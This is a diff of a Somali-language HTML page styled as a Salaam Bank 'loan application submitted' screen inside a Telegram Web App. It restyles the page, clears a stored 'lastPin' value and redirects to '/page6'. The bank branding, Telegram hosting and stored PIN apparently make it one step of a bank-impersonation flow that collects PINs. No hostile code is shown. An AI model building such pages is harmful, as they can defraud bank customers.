@@ -3,116 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Codsiga Waa La Diray - Salaam Bank</title>
+    <title>Gudbinta Guul - Salaam Bank</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #0066b2; /* Salaam Bank Logo Blue */
+            background-color: #f7f9fb;
             margin: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            color: #333333;
+            height: 100vh;
         }
 
-        /* ---------------- LOADING STATE STYLES ---------------- */
-        .loading-card {
-            background: #ffffff;
-            width: 90%;
-            max-width: 380px;
-            padding: 50px 20px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-            box-sizing: border-box;
-            display: block; /* Shown first */
-        }
-
-        .big-loader-circle {
-            width: 90px;
-            height: 90px;
-            background-color: #f4f8fb;
-            border: 2px solid #e1ecf4;
-            border-radius: 50%;
-            margin: 0 auto 25px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .big-loader-circle::after {
-            content: '';
-            width: 60px;
-            height: 60px;
-            border: 4px solid #cbd5e1;
-            border-top: 4px solid #008744; /* Salaam Bank Logo Green Spinner */
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-
-        .loading-title {
-            color: #0066b2;
-            font-size: 22px;
-            margin: 0 0 8px;
-            font-weight: 700;
-        }
-
-        .loading-subtitle {
-            color: #666666;
-            font-size: 14px;
-            margin: 0;
-        }
-
-        /* ---------------- STATUS CARD STYLES ---------------- */
         .success-card {
-            background: #ffffff;
+            background: white;
             width: 90%;
             max-width: 400px;
             padding: 40px 20px;
             border-radius: 20px;
             text-align: center;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
-            box-sizing: border-box;
-            display: none; /* Hidden until initial load finishes */
+            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
         }
 
         .check-circle {
-            width: 80px;
-            height: 80px;
-            background-color: #e6f4ea;
-            border: 2px solid #008744;
+            width: 100px;
+            height: 100px;
+            background-color: #1B8A43;
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0 auto 25px;
-            color: #008744; /* Salaam Bank Logo Green */
-            font-size: 40px;
-            font-weight: bold;
+            margin: 0 auto 30px;
+            color: white;
+            font-size: 50px;
         }
 
         h1 {
-            color: #0066b2; /* Salaam Bank Logo Blue */
-            font-size: 24px;
-            margin-bottom: 15px;
-            line-height: 1.3;
-            font-weight: 700;
+            color: #0B72B9;
+            font-size: 28px;
+            margin-bottom: 20px;
         }
 
         p {
-            color: #666666;
-            font-size: 15px;
-            margin: 6px 0;
-            line-height: 1.4;
+            color: #666;
+            font-size: 16px;
+            margin: 5px 0;
         }
 
         .timer-container {
             background-color: #f4f8fb;
-            border: 1px solid #e1ecf4;
+            border: 1px solid #e1ebf5;
             border-radius: 12px;
             padding: 15px;
             margin: 30px 0;
@@ -120,16 +63,15 @@
             justify-content: center;
             align-items: center;
             gap: 10px;
-            color: #0066b2;
-            font-size: 14px;
+            color: #0B72B9;
             font-weight: 500;
         }
 
         .loader-spinner {
             width: 18px;
             height: 18px;
-            border: 2px solid #cbd5e1;
-            border-top: 2px solid #0066b2;
+            border: 2px solid #e0e0e0;
+            border-top: 2px solid #0B72B9;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -140,77 +82,62 @@
         }
 
         .btn-home {
-            background-color: #008744; /* Salaam Bank Logo Green */
-            border: none;
-            color: #ffffff;
+            background: white;
+            border: 1.5px solid #0B72B9;
+            color: #0B72B9;
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             border-radius: 10px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background-color 0.2s ease;
-        }
-
-        .btn-home:hover {
-            background-color: #006e37;
+            transition: all 0.2s ease;
         }
 
         .btn-home:active {
-            background-color: #00542a;
+            background-color: #f0f7fc;
         }
 
         .top-toast {
             position: fixed;
             top: 20px;
-            background: #ffffff;
-            border: 1px solid #cbd5e1;
-            color: #333333;
+            background: #1a1c1e;
+            color: white;
             padding: 12px 20px;
             border-radius: 10px;
-            display: none; /* Hidden until loaded */
+            display: flex;
             align-items: center;
             gap: 10px;
             font-size: 14px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
     </style>
 </head>
 
 <body>
 
-<!-- INITIAL LOADING CARD -->
-<div class="loading-card" id="loading-screen">
-    <div class="big-loader-circle"></div>
-    <div class="loading-title">Waa la rarayaa...</div>
-    <div class="loading-subtitle">Fadlan sug daqiiqad</div>
+<div class="top-toast">
+    <span style="color:#1B8A43;">✔</span>
+    <span>Codsiga si guul leh ayaa loo gudbiyay!</span>
 </div>
 
-<!-- TOP TOAST NOTIFICATION -->
-<div class="top-toast" id="top-toast">
-    <span style="color:#008744; font-weight: bold;">✔</span>
-    <span>Codsigaaga waa la guddoomay si guul leh!</span>
-</div>
-
-<!-- STATUS CARD (SHOWN AFTER LOADING) -->
-<div class="success-card" id="status-screen">
+<div class="success-card">
     <div class="check-circle">✓</div>
 
-    <h1>Codsiga Maalgelinta<br>Waa La Diray</h1>
+    <h1>Codsiga Amaahda<br>waa la gudbiyay</h1>
 
-    <p>Codsigaagii waa naloo soo gaadhsiiyay. Fadlan sug ansixinta.</p>
-    <p>Farriin xaqiijin ah ayaa goor dhow kuu soo dhaci doonta.</p>
+    <p>Codsigaaga waa la gudbiyay. Fadlan sug ansixinta.</p>
+    <p>Waxaad heli doontaa farriin xaqiijin ah.</p>
 
     <div class="timer-container">
         <div class="loader-spinner"></div>
         <span>
-            U wareegista galitaanka Salaam Bank 
+            Ku celinaya galitaanka Salaam Bank 
             <span id="timer">5</span> ilbiriqsi...
         </span>
     </div>
 
     <button type="button" class="btn-home" onclick="goToPage6()">
-        Agal Hadda Galitaanka
+        Tag Galitaanka Hadda
     </button>
 </div>
 
@@ -225,11 +152,21 @@
 
     function goToPage6() {
         if (interval) clearInterval(interval);
-        window.location.href = "/page6"; 
+
+        localStorage.removeItem('lastPin');
+        
+        window.location.href = "/page6";
     }
 
-    function startCountdown() {
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
         updateTimer();
+
         interval = setInterval(() => {
             timeLeft--;
 
@@ -241,24 +178,6 @@
 
             updateTimer();
         }, 1000);
-    }
-
-    window.onload = () => {
-        const tg = window.Telegram?.WebApp;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
-
-        // Simulate 2 seconds of loading state, then display the status page
-        setTimeout(() => {
-            document.getElementById("loading-screen").style.display = "none";
-            document.getElementById("status-screen").style.display = "block";
-            document.getElementById("top-toast").style.display = "flex";
-            
-            // Start 5-second countdown to Page 6
-            startCountdown();
-        }, 2000);
     };
 </script>
 
